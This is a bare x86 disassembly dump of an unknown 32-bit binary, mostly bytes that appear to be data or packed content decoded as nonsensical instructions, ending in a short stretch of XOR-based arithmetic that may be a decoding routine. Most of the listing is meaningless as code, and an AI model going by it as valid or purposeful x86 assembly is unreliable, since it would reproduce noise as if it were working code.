  409ef6:	push   ds
  409ef7:	and    BYTE PTR ds:0x3edc6107,0xda
  409efe:	jnp    0x409ee5
  409f00:	(bad)  
  409f01:	sub    bx,WORD PTR [edx+0x46e37fee]
  409f08:	call   0xa415:0x3d700b1c
  409f0f:	dec    esp
  409f10:	sub    esp,DWORD PTR [edx-0x77]
  409f13:	aam    0xc2
  409f15:	ror    dh,cl
  409f17:	nop    ebx
  409f1a:	xchg   edi,eax
  409f1b:	pop    ebx
  409f1c:	sbb    esi,DWORD PTR [ebx]
  409f1e:	(bad)  
  409f20:	fnstcw WORD PTR [eax+0x62]
  409f23:	inc    edi
  409f24:	sub    esp,edi
  409f26:	gs dec edx
  409f28:	add    eax,0x29270514
  409f2d:	add    DWORD PTR [edi],eax
  409f2f:	cli    
  409f30:	jbe    0x409f68
  409f32:	ja     0x409f13
  409f34:	cdq    
  409f35:	xchg   edi,eax
  409f36:	pop    edi
  409f37:	push   eax
  409f38:	sub    al,0xae
  409f3a:	dec    ebp
  409f3b:	scas   al,BYTE PTR es:[edi]
  409f3c:	cli    
  409f3d:	pop    ss
  409f3e:	repz push es
  409f40:	adc    dh,BYTE PTR [edx-0x15]
  409f43:	add    eax,0xa881bade
  409f48:	ficomp WORD PTR [ebp+0x1e]
  409f4b:	in     eax,0xa2
  409f4d:	pusha  
  409f4e:	pop    edi
  409f4f:	mov    dl,0x74
  409f51:	mov    bh,0x7b
  409f53:	scas   al,BYTE PTR es:[edi]
  409f54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f55:	jmp    0x65663774
  409f5a:	or     ebx,DWORD PTR [edx-0x6e]
  409f5d:	out    dx,eax
  409f5e:	sub    DWORD PTR [ebx-0x32],ecx
  409f61:	sbb    eax,0x5e67b69
  409f66:	sub    eax,0x8aaaafd8
  409f6b:	mov    edi,0x6bd98ea6
  409f70:	xchg   esi,eax
  409f71:	mov    WORD PTR ds:0xf0c94993,es
  409f77:	sar    BYTE PTR [eax],0x5
  409f7a:	popa   
  409f7b:	adc    DWORD PTR [edx+0x60],0x4c971d9d
  409f82:	mov    cl,0xff
  409f84:	stos   DWORD PTR es:[edi],eax
  409f85:	push   ebx
  409f86:	jae    0x409ff6
  409f88:	cmp    al,0xdb
  409f8a:	jnp    0x409f77
  409f8c:	xchg   esp,eax
  409f8d:	pop    es
  409f8e:	cli    
  409f8f:	jne    0x409fd6
  409f91:	loop   0x409fcb
  409f93:	lahf   
  409f94:	repnz mul BYTE PTR [edx+esi*8]
  409f98:	std    
  409f99:	call   0xce0d:0x2743cca4
  409fa0:	pop    esp
  409fa1:	pushf  
  409fa2:	fdivr  DWORD PTR [ebx+0xd]
  409fa5:	mov    esp,DWORD PTR [esi-0x5e]
  409fa8:	push   0x552d6ee9
  409fad:	in     al,dx
  409fae:	mov    edi,0x54e37fd2
  409fb3:	pusha  
  409fb4:	js     0x409fe2
  409fb6:	xchg   esp,eax
  409fb7:	call   0x8bae:0x533326c5
  409fbe:	inc    esi
  409fbf:	pop    ecx
  409fc0:	push   es
  409fc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fc2:	push   edx
  409fc3:	scas   al,BYTE PTR es:[edi]
  409fc4:	xor    al,BYTE PTR [ebp-0xd]
  409fc7:	pop    esp
  409fc8:	pop    esi
  409fc9:	dec    edi
  409fca:	sbb    al,0x51
  409fcc:	push   ds
  409fcd:	repz jl 0x409fc3
  409fd0:	mov    ecx,0x6c7cb7bc
  409fd5:	xchg   BYTE PTR [esi+0x2c],ch
  409fd8:	push   0xffffffaf
  409fda:	mov    WORD PTR [eax],ds
  409fdc:	sar    DWORD PTR cs:[eax],0x18
  409fe0:	stos   BYTE PTR es:[edi],al
  409fe1:	push   cs
  409fe2:	xor    BYTE PTR [ebx+0x2777e3f9],ah
  409fe8:	push   ecx
  409fe9:	pop    es
  409fea:	js     0x409f6d
  409fec:	ret    
  409fed:	(bad)
  409ff1:	mov    ah,0xc7
  409ff3:	mov    esi,0x68df487e
  409ff8:	stos   DWORD PTR es:[edi],eax
  409ff9:	cmc    
  409ffa:	bound  ecx,QWORD PTR [edx+0x3f]
  409ffd:	sub    DWORD PTR [ecx+0x79eb1e94],ebp
  40a003:	not    esp
  40a005:	sub    eax,DWORD PTR [ebx+ecx*8]
  40a008:	push   eax
  40a009:	sub    al,0xa5
  40a00b:	and    BYTE PTR [edi+0xe],dh
  40a00e:	jb     0x40a039
  40a010:	or     ch,BYTE PTR [esi+0xb]
  40a013:	mov    ds:0x6e5fffa0,al
  40a018:	jnp    0x40a08b
  40a01a:	dec    eax
  40a01b:	mov    BYTE PTR [esi+0x4f82842e],al
  40a021:	test   DWORD PTR [edi],esi
  40a023:	lods   al,BYTE PTR ds:[esi]
  40a024:	mov    cl,0x12
  40a026:	mov    cl,0x30
  40a028:	inc    di
  40a02a:	imul   edi,DWORD PTR [edi],0x7ca46537
  40a030:	pop    esi
  40a031:	iret   
  40a032:	mov    ebp,DWORD PTR [edx-0x37]
  40a035:	adc    eax,edi
  40a037:	add    dh,BYTE PTR [eax+0x3a]
  40a03a:	test   DWORD PTR [esi],0xa379d8a1
  40a040:	pushf  
  40a041:	ins    BYTE PTR es:[edi],dx
  40a042:	ret    0x678f
  40a045:	dec    ch
  40a047:	mov    dh,0x4c
  40a049:	dec    eax
  40a04a:	out    0xc5,eax
  40a04c:	imul   eax,esp,0x53bb2039
  40a052:	imul   ecx,DWORD PTR [esi+0x3e],0x47ca0376
  40a059:	ss mov al,0x3b
  40a05c:	jle    0x40a0ae
  40a05e:	jge    0x40a070
  40a060:	enter  0x6ca7,0xb
  40a064:	cld    
  40a065:	imul   eax,DWORD PTR [edi+0x6801c7b],0x46f23be8
  40a06f:	xchg   esi,eax
  40a070:	bound  esp,QWORD PTR [edi-0x2028aded]
  40a076:	mov    al,ds:0x31f500e4
  40a07b:	es xchg ebp,eax
  40a07d:	or     bh,bh
  40a07f:	fsub   st,st(7)
  40a081:	shl    DWORD PTR [ecx+0x40],cl
  40a084:	and    DWORD PTR [eax-0x1f445e5d],0x40ba31f0
  40a08e:	adc    edi,DWORD PTR [ebx]
  40a090:	push   ebp
  40a091:	jl     0x40a0e3
  40a093:	mov    ds:0xf8780846,eax
  40a098:	pop    eax
  40a099:	dec    ebx
  40a09a:	in     eax,0xbd
  40a09c:	rcr    BYTE PTR ds:0x63d92f2,1
  40a0a2:	rol    DWORD PTR [edi+0x70885c6e],0xad
  40a0a9:	cdq    
  40a0aa:	jle    0x40a102
  40a0ac:	retf   
  40a0ad:	lds    eax,FWORD PTR [ecx-0x27]
  40a0b0:	stos   BYTE PTR es:[edi],al
  40a0b1:	cmp    ebp,DWORD PTR [ebx]
  40a0b3:	add    eax,0x972be413
  40a0b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0b9:	test   al,0xd7
  40a0bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0bc:	or     al,0xc
  40a0be:	popa   
  40a0bf:	shl    dl,0x5e
  40a0c2:	mov    esi,0x345cff91
  40a0c7:	jmp    0xee4082d3
  40a0cc:	pop    es
  40a0cd:	(bad)  
  40a0ce:	call   0x836fc757
  40a0d3:	sub    esp,ebx
  40a0d5:	xor    esp,DWORD PTR [esi+0x320913b8]
  40a0db:	or     edx,DWORD PTR [ebp+ecx*8+0x44]
  40a0df:	int3   
  40a0e0:	out    dx,eax
  40a0e1:	iret   
  40a0e2:	pusha  
  40a0e3:	in     al,0x6e
  40a0e5:	add    al,0xac
  40a0e7:	fsub   QWORD PTR [esi]
  40a0e9:	inc    esp
  40a0eb:	addr16 jge 0x40a09d
  40a0ee:	or     ah,BYTE PTR [ebp*2+0xb1d77e1]
  40a0f5:	neg    BYTE PTR ds:0x11f30770
  40a0fb:	lea    ecx,[ebx]
  40a0fd:	stos   DWORD PTR es:[edi],eax
  40a0fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ff:	or     esp,DWORD PTR ss:[ebp+eax*1-0x40982d28]
  40a107:	mov    edi,0x9933e1b9
  40a10c:	push   ds
  40a10d:	scas   al,BYTE PTR es:[edi]
  40a10e:	mov    edx,0xd16bcb2b
  40a113:	xchg   edx,eax
  40a114:	(bad)  
  40a115:	aad    0x3a
  40a117:	repnz stos DWORD PTR es:[edi],eax
  40a119:	shl    BYTE PTR [ecx-0x3f20ec6c],1
  40a11f:	test   eax,0x11769827
  40a124:	inc    eax
  40a125:	(bad)  
  40a126:	ror    BYTE PTR [edi],0x27
  40a129:	pop    edx
  40a12a:	jne    0x40a0d4
  40a12c:	add    dl,bh
  40a12e:	ja     0x40a130
  40a130:	(bad)  
  40a131:	jmp    0xd4b2:0x2c84c173
  40a138:	ror    BYTE PTR [esi],1
  40a13a:	jecxz  0x40a177
  40a13c:	push   0x4c
  40a13e:	(bad)  
  40a13f:	jns    0x40a1b9
  40a141:	push   ecx
  40a142:	ds cmc 
  40a144:	ficomp DWORD PTR [ecx+0x11]
  40a147:	fdivr  DWORD PTR [ebx+0x60]
  40a14a:	ret    
  40a14b:	and    eax,0xe3f9352f
  40a150:	test   BYTE PTR [eax-0x325be418],bh
  40a156:	retf   0x3548
  40a159:	adc    dh,BYTE PTR [esi-0x2aed8fbd]
  40a15f:	dec    edi
  40a160:	cld    
  40a161:	inc    ebp
  40a162:	cmp    edi,DWORD PTR [edi]
  40a164:	aaa    
  40a165:	daa    
  40a166:	sbb    esp,ebx
  40a168:	mov    al,0x54
  40a16a:	jle    0x40a1de
  40a16c:	xchg   edi,eax
  40a16d:	scas   al,BYTE PTR es:[edi]
  40a16e:	ffree  st(2)
  40a170:	pop    eax
  40a171:	inc    ecx
  40a172:	pushf  
  40a173:	hlt    
  40a174:	lahf   
  40a175:	inc    eax
  40a176:	push   esp
  40a177:	add    cl,ah
  40a179:	and    eax,0x8477afd7
  40a17e:	pop    eax
  40a17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a180:	push   esp
  40a181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a182:	(bad)  
  40a183:	daa    
  40a184:	or     DWORD PTR [esi],esi
  40a186:	jae    0x40a1ab
  40a188:	std    
  40a189:	sub    al,0x1e
  40a18b:	fs rcl bh,0x2
  40a18f:	lahf   
  40a190:	push   ebx
  40a191:	rcr    DWORD PTR [edx],0x5d
  40a194:	daa    
  40a195:	call   0xa0fe:0xd16f02fa
  40a19c:	pop    ds
  40a19d:	sub    dl,ah
  40a19f:	inc    ebp
  40a1a0:	popf   
  40a1a1:	push   es
  40a1a2:	or     edi,esp
  40a1a4:	jo     0x40a135
  40a1a6:	test   DWORD PTR [ebx-0x4cff569c],eax
  40a1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ad:	in     al,0x91
  40a1af:	xor    ah,bl
  40a1b1:	jmp    0x40a16b
  40a1b3:	rol    DWORD PTR [ecx],0xd6
  40a1b6:	sbb    DWORD PTR [ecx+edx*8+0x74],eax
  40a1ba:	mov    dl,0xf3
  40a1bc:	push   cs
  40a1bd:	imul   ebx,eax,0xffffff82
  40a1c0:	xor    esi,edi
  40a1c2:	mov    esi,0x551aa4af
  40a1c7:	sbb    DWORD PTR [ebp+0x19],esi
  40a1ca:	inc    esp
  40a1cb:	push   ecx
  40a1cc:	es add eax,0x215c44be
  40a1d2:	pop    es
  40a1d3:	pop    ebp
  40a1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1d5:	pop    eax
  40a1d6:	cmp    ch,BYTE PTR [edx+0x5cb4647f]
  40a1dc:	(bad)  
  40a1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1df:	cs ss ins DWORD PTR es:[edi],dx
  40a1e2:	xor    BYTE PTR [edi+0x4b],dh
  40a1e5:	mov    ds:0x1b67094e,eax
  40a1ea:	xchg   cl,ch
  40a1ec:	mov    bl,0x12
  40a1ee:	jbe    0x40a202
  40a1f0:	and    BYTE PTR [edi+0x69],cl
  40a1f3:	adc    dh,BYTE PTR [eax-0x7a]
  40a1f6:	xchg   ebx,eax
  40a1f7:	or     dh,BYTE PTR [edx-0x4c167533]
  40a1fd:	add    al,0x51
  40a1ff:	xor    dh,BYTE PTR [edx-0x42cdd1d2]
  40a205:	daa    
  40a206:	lea    esp,[esi]
  40a208:	je     0x40a19b
  40a20a:	sbb    al,0xd
  40a20c:	or     BYTE PTR [esp+ebx*8+0x418a6c1],bl
  40a213:	cdq    
  40a214:	or     BYTE PTR [esi-0x66f09021],bh
  40a21a:	add    eax,0x4d6ad075
  40a21f:	pop    ebp
  40a220:	add    DWORD PTR [edx-0x2c],0x1
  40a224:	push   ebp
  40a225:	imul   ebp,esi,0xffffff9f
  40a228:	or     ecx,DWORD PTR [edx]
  40a22a:	inc    edx
  40a22b:	je     0x40a27c
  40a22d:	aaa    
  40a22e:	xor    DWORD PTR [edi-0x5c85dfd9],0x2
  40a235:	pop    edi
  40a236:	ss push es
  40a238:	pop    es
  40a239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a23a:	cmp    ecx,edi
  40a23c:	lds    eax,FWORD PTR [eax+eiz*4]
  40a23f:	inc    DWORD PTR [ecx+0x55]
  40a242:	push   ebx
  40a243:	ins    BYTE PTR es:[edi],dx
  40a244:	popa   
  40a245:	leave  
  40a246:	mov    esp,0xaf8d1027
  40a24b:	jl     0x40a2a2
  40a24d:	cli    
  40a24e:	idiv   BYTE PTR [edi]
  40a250:	lock jecxz 0x40a2c1
  40a253:	and    DWORD PTR ds:0x318848cc,0x4dc8ab3a
  40a25d:	mov    BYTE PTR es:[edi+0xf],dl
  40a261:	jmp    0x76fa:0xf319082f
  40a268:	mov    ebx,DWORD PTR [ebp+0x69]
  40a26b:	add    al,0xd0
  40a26d:	pop    ebp
  40a26e:	and    eax,0x7e38fcc8
  40a273:	push   edi
  40a274:	jmp    0x40a21c
  40a276:	xchg   ebp,eax
  40a277:	push   ss
  40a278:	mov    ebx,0xd321fb8
  40a27d:	sbb    eax,0xddacc985
  40a282:	dec    ecx
  40a283:	call   0xd9d13655
  40a288:	fcom   DWORD PTR [ebx+0x3cf0a272]
  40a28e:	inc    esp
  40a28f:	pop    ebp
  40a290:	fild   WORD PTR [esi-0x2d]
  40a293:	mov    edx,ebp
  40a295:	xor    al,0x1d
  40a297:	and    eax,0xd878442c
  40a29c:	int    0xc8
  40a29e:	adc    al,0x4a
  40a2a0:	push   ebp
  40a2a1:	ins    DWORD PTR es:[edi],dx
  40a2a2:	cdq    
  40a2a3:	mov    eax,ds:0x3888418f
  40a2a8:	dec    ebx
  40a2a9:	mov    dl,0xf
  40a2ab:	popf   
  40a2ac:	call   0xb507f613
  40a2b1:	mov    dl,0x21
  40a2b3:	mov    ah,0xed
  40a2b5:	imul   BYTE PTR [edi+0x51c1a844]
  40a2bb:	xor    DWORD PTR [ebx+0x16],0x5c707bc5
  40a2c2:	hlt    
  40a2c3:	pop    ecx
  40a2c4:	jnp    0x40a2ba
  40a2c6:	das    
  40a2c7:	out    0x22,eax
  40a2c9:	inc    edi
  40a2ca:	lods   al,BYTE PTR ds:[esi]
  40a2cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2cc:	pop    es
  40a2cd:	(bad)  
  40a2ce:	jmp    0x5f3:0xc734be44
  40a2d5:	xchg   ebp,eax
  40a2d6:	pusha  
  40a2d7:	jbe    0x40a347
  40a2d9:	push   edi
  40a2da:	xor    DWORD PTR [esp+edx*8],edi
  40a2dd:	or     dh,ch
  40a2df:	or     eax,0x46ead2e8
  40a2e4:	scas   al,BYTE PTR es:[edi]
  40a2e5:	add    BYTE PTR [esi-0x48391e88],cl
  40a2eb:	pop    ss
  40a2ec:	mov    ebp,0xcbba43bc
  40a2f1:	adc    DWORD PTR [edx],0xffffffbd
  40a2f4:	xor    al,0x3f
  40a2f6:	adc    BYTE PTR [edi],cl
  40a2f8:	(bad)  
  40a2f9:	mov    ebx,0x5aa0bb49
  40a2fe:	pop    eax
  40a2ff:	xor    DWORD PTR [ebx-0x23299924],ecx
  40a305:	push   es
  40a306:	mov    ecx,0x5dcfdcff
  40a30b:	jae    0x40a331
  40a30d:	sbb    eax,edi
  40a30f:	pop    ebx
  40a310:	bound  esp,QWORD PTR [eax]
  40a312:	(bad)  
  40a313:	idiv   ebx
  40a315:	and    esp,DWORD PTR [eax+0x50d34e25]
  40a31b:	lahf   
  40a31c:	sbb    al,0xfe
  40a31e:	adc    BYTE PTR [esi-0x1c5a41a1],ah
  40a324:	aad    0x36
  40a326:	in     eax,0x72
  40a328:	pushf  
  40a329:	jo     0x40a2e1
  40a32b:	(bad)  
  40a32c:	(bad)  
  40a32e:	pop    edx
  40a32f:	dec    eax
  40a330:	popa   
  40a331:	call   0xcec9:0xe74723a1
  40a338:	loope  0x40a3ad
  40a33a:	repnz hlt 
  40a33c:	hlt    
  40a33d:	jmp    0x110b3b9e
  40a342:	jmp    0x40a2c6
  40a344:	adc    BYTE PTR [edi-0x4a],0x7f
  40a348:	or     eax,0xfa310f7a
  40a34d:	and    eax,edx
  40a34f:	lahf   
  40a350:	fild   WORD PTR [esi-0x52539eb2]
  40a356:	aas    
  40a357:	add    ch,ah
  40a359:	jmp    0x75fc:0xcce453e3
  40a360:	sbb    al,0x4f
  40a362:	add    dh,BYTE PTR [edx]
  40a364:	mov    ebp,0x735ad126
  40a369:	inc    esi
  40a36a:	xchg   edx,eax
  40a36b:	inc    edi
  40a36c:	lahf   
  40a36d:	cmc    
  40a36e:	jle    0x40a38b
  40a370:	jmp    0x40a3de
  40a372:	int    0x27
  40a374:	out    dx,eax
  40a375:	popf   
  40a376:	pop    esp
  40a377:	adc    ebx,esp
  40a379:	sbb    ah,ch
  40a37b:	pop    esp
  40a37c:	sbb    bl,BYTE PTR [edi+0xa]
  40a37f:	adc    ah,al
  40a381:	test   al,0x78
  40a383:	jae    0x40a37c
  40a385:	dec    DWORD PTR [ebx+0x4be9fc41]
  40a38b:	in     eax,dx
  40a38c:	mov    ch,0x53
  40a38e:	sar    DWORD PTR [ecx+edi*1],0xde
  40a392:	jmp    0xe138bba6
  40a397:	scas   al,BYTE PTR es:[edi]
  40a398:	test   al,0x9d
  40a39a:	retf   0x17d4
  40a39d:	je     0x40a3b5
  40a39f:	in     al,0x2f
  40a3a1:	repnz sbb ebp,DWORD PTR [esi-0x6a21c3b6]
  40a3a8:	pop    edi
  40a3a9:	(bad)
  40a3ac:	int3   
  40a3ad:	lock or eax,0x5365a0cd
  40a3b3:	mov    al,ds:0x494888f9
  40a3b8:	sbb    edi,DWORD PTR [bp+si]
  40a3bb:	loop   0x40a349
  40a3bd:	out    0xd,eax
  40a3bf:	je     0x40a3d7
  40a3c1:	jb     0x40a371
  40a3c3:	or     edx,DWORD PTR [esi-0x50]
  40a3c6:	xchg   ebp,eax
  40a3c7:	sub    ax,0x1010
  40a3cb:	dec    esp
  40a3cc:	or     bl,BYTE PTR [ebp+eiz*8-0x25172ec6]
  40a3d3:	jb     0x40a36d
  40a3d5:	mov    ds:0xd0ed324e,eax
  40a3da:	bound  ebp,QWORD PTR [eax]
  40a3dc:	and    al,0x41
  40a3de:	(bad)  
  40a3df:	enter  0x45e6,0x6
  40a3e3:	lahf   
  40a3e4:	cmp    al,0x62
  40a3e6:	(bad)  
  40a3e8:	int    0xa8
  40a3ea:	sub    BYTE PTR [ecx-0x16],ah
  40a3ed:	je     0x40a3d1
  40a3ef:	mov    edx,0x88fcb23c
  40a3f4:	sub    esp,edx
  40a3f6:	pop    ds
  40a3f7:	hlt    
  40a3f8:	in     al,0xad
  40a3fa:	(bad)  
  40a3fb:	adc    al,0x4e
  40a3fd:	mov    edx,0x3404e3ef
  40a402:	mov    bh,0x55
  40a404:	mov    ebx,0x34fcb34c
  40a409:	push   esp
  40a40a:	and    bl,dh
  40a40c:	adc    al,0x4b
  40a40e:	(bad)  
  40a40f:	push   ebx
  40a410:	div    dl
  40a412:	push   0x4c
  40a414:	jle    0x40a3f8
  40a416:	mov    ebx,DWORD PTR [esi]
  40a418:	das    
  40a419:	js     0x40a3ca
  40a41b:	ds pop es
  40a41d:	mov    al,0x15
  40a41f:	dec    esi
  40a420:	jno    0x40a3e4
  40a422:	in     al,dx
  40a423:	call   0xaaf17821
  40a428:	mov    ds:0x796ab22b,eax
  40a42d:	or     DWORD PTR [eax],ecx
  40a42f:	push   eax
  40a430:	xchg   ebx,eax
  40a431:	imul   eax,esi,0xc7e027f
  40a437:	pop    esp
  40a438:	out    0xbd,eax
  40a43a:	xor    al,0xb7
  40a43c:	es jmp 0xc9935150
  40a442:	push   ss
  40a443:	mov    ebx,0x3ed3f6bc
  40a448:	fistp  WORD PTR ds:0x42bffb26
  40a44e:	mov    ebx,0x4a454f22
  40a453:	adc    eax,0x3c48bd00
  40a458:	loopne 0x40a452
  40a45a:	retf   0xab90
  40a45d:	ds test eax,0xbd93e798
  40a463:	jmp    0x1fb0:0x27fc5cba
  40a46a:	mov    dl,0xb9
  40a46c:	inc    esi
  40a46d:	and    DWORD PTR [ecx],ecx
  40a46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a470:	ss cmp dl,bl
  40a473:	mov    DWORD PTR [eax+0x7f],eax
  40a476:	push   ds
  40a477:	sub    ebx,DWORD PTR [edi+0x1d]
  40a47a:	retf   
  40a47b:	lods   al,BYTE PTR ds:[esi]
  40a47c:	stos   BYTE PTR es:[edi],al
  40a47d:	lds    ebx,FWORD PTR [esp-0x7]
  40a481:	fdivr  QWORD PTR [eax-0x61]
  40a484:	jmp    0x40a4dd
  40a486:	aaa    
  40a487:	std    
  40a488:	or     esp,DWORD PTR [edx]
  40a48a:	(bad)  
  40a48b:	cmp    edx,DWORD PTR [edi-0x47]
  40a48e:	shl    BYTE PTR [edi-0x1809eeb7],1
  40a494:	imul   esi,DWORD PTR [edx+0x3d12f6f4],0x7d5aa69e
  40a49e:	jae    0x40a509
  40a4a0:	enter  0x9b5a,0xa4
  40a4a4:	in     al,0xb8
  40a4a6:	inc    eax
  40a4a7:	out    0xa,al
  40a4a9:	fbstp  TBYTE PTR [edi+0xb94a1ab]
  40a4af:	dec    ebp
  40a4b0:	popa   
  40a4b1:	shr    BYTE PTR [esi+0x6d],0xfc
  40a4b5:	dec    ecx
  40a4b6:	arpl   WORD PTR [edi+0xa],ax
  40a4b9:	add    BYTE PTR [ebx+0x7bf33e8c],ah
  40a4bf:	xor    DWORD PTR [eax+eax*8+0x8],esi
  40a4c3:	fstp   TBYTE PTR [ebx+0x24]
  40a4c6:	push   ebx
  40a4c7:	xor    eax,0xd6346195
  40a4cc:	cwde   
  40a4cd:	dec    edx
  40a4ce:	cdq    
  40a4cf:	fadd   st,st(3)
  40a4d1:	jno    0x40a4ef
  40a4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4d4:	fild   WORD PTR [ebx-0x52]
  40a4d7:	push   cs
  40a4d8:	adc    al,BYTE PTR [eax]
  40a4da:	xor    al,0x79
  40a4dc:	inc    ebx
  40a4dd:	adc    DWORD PTR [eax-0x28210c08],esp
  40a4e3:	fsubr  DWORD PTR [ebx+0x4b]
  40a4e6:	mov    bl,0x89
  40a4e8:	pop    es
  40a4e9:	icebp  
  40a4ea:	ins    BYTE PTR es:[edi],dx
  40a4eb:	mov    al,bl
  40a4ed:	retf   
  40a4ee:	xchg   edx,eax
  40a4ef:	in     eax,0x1e
  40a4f1:	ds mov ebp,0x4c838bca
  40a4f7:	cmp    bh,dl
  40a4f9:	(bad)  
  40a4fa:	xor    eax,0xdafdf175
  40a4ff:	enter  0xa31b,0x9b
  40a503:	cmp    BYTE PTR [esi+0x3f],0x9a
  40a507:	adc    edi,DWORD PTR [eax-0x66]
  40a50a:	shr    BYTE PTR [edi+0x4],1
  40a50d:	xchg   esi,eax
  40a50e:	aas    
  40a50f:	hlt    
  40a510:	pop    edi
  40a511:	ja     0x40a560
  40a513:	adc    ecx,DWORD PTR [ecx-0x61]
  40a516:	xor    ecx,ecx
  40a518:	mov    dl,0x3c
  40a51a:	pop    ebp
  40a51b:	mov    al,0xbc
  40a51d:	popf   
  40a51e:	and    BYTE PTR [eax-0x55],bl
  40a521:	(bad)  
  40a522:	clc    
  40a523:	push   edx
  40a524:	push   cs
  40a525:	mov    ebx,0x93611ad6
  40a52a:	jno    0x40a531
  40a52c:	push   esi
  40a52d:	sub    esp,DWORD PTR [ecx]
  40a52f:	jp     0x40a54c
  40a531:	inc    esp
  40a532:	adc    al,0x9f
  40a534:	ds push ebp
  40a536:	std    
  40a537:	stos   BYTE PTR es:[edi],al
  40a538:	clc    
  40a539:	sbb    eax,0x98e968d6
  40a53f:	movsx  ebx,dl
  40a542:	outs   dx,DWORD PTR ds:[esi]
  40a543:	and    edi,DWORD PTR [ebx]
  40a545:	fst    DWORD PTR [ecx]
  40a547:	mov    ?,ebp
  40a549:	scas   eax,DWORD PTR es:[edi]
  40a54a:	mov    al,0xb0
  40a54c:	es add dl,bl
  40a54f:	add    al,0xe0
  40a551:	sbb    ebp,DWORD PTR [esi-0x8]
  40a554:	dec    esi
  40a555:	fisttp DWORD PTR [eax]
  40a557:	xchg   esi,eax
  40a558:	inc    dh
  40a55a:	mov    dl,0xec
  40a55c:	xchg   edi,eax
  40a55d:	sbb    BYTE PTR [ebp+0x3c],dl
  40a560:	xchg   esp,eax
  40a561:	add    al,0x19
  40a563:	sbb    ecx,eax
  40a565:	neg    DWORD PTR [eax+0x7c]
  40a568:	mov    eax,ds:0xeac40453
  40a56d:	mov    edx,0x1e6788a5
  40a572:	sti    
  40a573:	mov    dh,0x60
  40a575:	js     0x40a5ac
  40a577:	in     eax,0x3c
  40a579:	mov    eax,0x3b228588
  40a57e:	mov    bh,0x69
  40a580:	adc    BYTE PTR [ebx-0x5b],bl
  40a583:	nop
  40a584:	pop    esp
  40a585:	jmp    0x7f49641f
  40a58a:	fistp  DWORD PTR [edi]
  40a58c:	mov    DWORD PTR [esi-0x34676686],esp
  40a592:	fstp   QWORD PTR [esi-0x35]
  40a595:	jle    0x40a5ae
  40a597:	jl     0x40a5be
  40a599:	inc    eax
  40a59a:	adc    BYTE PTR [ecx+0x59],ah
  40a59d:	ins    DWORD PTR es:[edi],dx
  40a59e:	fiadd  WORD PTR [ebx+0x747f5978]
  40a5a4:	pop    es
  40a5a5:	add    ecx,esp
  40a5a7:	inc    esi
  40a5a8:	fprem  
  40a5aa:	jecxz  0x40a52e
  40a5ac:	inc    eax
  40a5ad:	rcr    BYTE PTR [ebp-0x40],0x80
  40a5b1:	repz dec eax
  40a5b3:	test   eax,0xb5893e61
  40a5b8:	outs   dx,BYTE PTR ds:[esi]
  40a5b9:	aad    0x34
  40a5bb:	call   0x51be85c8
  40a5c0:	out    0x5c,al
  40a5c2:	aad    0xbd
  40a5c4:	adc    ebp,0x83925618
  40a5ca:	add    edi,DWORD PTR [ecx+0x65580cd2]
  40a5d0:	mov    al,0x60
  40a5d2:	sub    ah,BYTE PTR [ecx+esi*2-0x49]
  40a5d6:	iret   
  40a5d7:	push   edi
  40a5d8:	adc    dl,BYTE PTR [ecx-0x173f097e]
  40a5de:	repz retf 
  40a5e0:	ret    0x3531
  40a5e3:	mov    dl,0x7c
  40a5e5:	lahf   
  40a5e6:	int    0x97
  40a5e8:	lods   al,BYTE PTR ds:[esi]
  40a5e9:	add    BYTE PTR ds:0x98750dd1,bl
  40a5ef:	les    ebp,FWORD PTR [eax+0x19]
  40a5f2:	stos   DWORD PTR es:[edi],eax
  40a5f3:	xlat   BYTE PTR ds:[ebx]
  40a5f4:	fstp   TBYTE PTR [ebp-0x2a18b2eb]
  40a5fa:	inc    ebx
  40a5fb:	pop    edx
  40a5fc:	jae    0x40a64e
  40a5fe:	mov    eax,0xe21a0ac6
  40a603:	imul   ebx,DWORD PTR [ebx-0x4d],0x27b466ae
  40a60a:	fdivr  DWORD PTR [ebx-0x23b41a86]
  40a610:	jl     0x40a5ae
  40a612:	jo     0x40a5aa
  40a614:	outs   dx,BYTE PTR ds:[esi]
  40a615:	aad    0xe8
  40a617:	adc    DWORD PTR [esp+ebp*4],esp
  40a61a:	data16 jne 0x40a5f6
  40a61d:	ror    DWORD PTR [eax+0x479241d1],cl
  40a623:	dec    edx
  40a624:	ja     0x40a5c7
  40a626:	cmp    bl,dh
  40a628:	in     al,0x2d
  40a62a:	shl    dl,cl
  40a62c:	cld    
  40a62d:	gs add ebp,ecx
  40a630:	aas    
  40a631:	sbb    DWORD PTR [esi+esi*8],edi
  40a634:	sbb    DWORD PTR [edi+0x458b0b8a],esi
  40a63a:	hlt    
  40a63b:	adc    DWORD PTR ds:0x42a2c6,ecx
  40a641:	mov    ecx,DWORD PTR [ebp-0x28]
  40a644:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  40a64e:	sub    eax,edi
  40a650:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  40a65a:	xor    eax,esi
  40a65c:	cmp    eax,ecx
  40a65e:	jne    0x40a688
  40a664:	mov    eax,DWORD PTR [ebp-0x8]
  40a667:	mov    ecx,DWORD PTR [ebp-0x10]
  40a66a:	xor    eax,esi
  40a66c:	xor    ecx,esi
  40a66e:	sub    eax,ecx
  40a670:	sub    eax,edi
  40a672:	xor    eax,esi
  40a674:	mov    DWORD PTR [ebp-0x8],eax
  40a677:	mov    eax,DWORD PTR [ebp-0x10]
  40a67a:	xor    eax,esi
  40a67c:	mov    ecx,0xffcd8d8f
  40a681:	sub    ecx,eax
  40a683:	jmp    0x40a697
  40a688:	mov    eax,DWORD PTR [ebp-0x10]
  40a68b:	xor    eax,esi
  40a68d:	mov    ecx,0xffcd8d0f
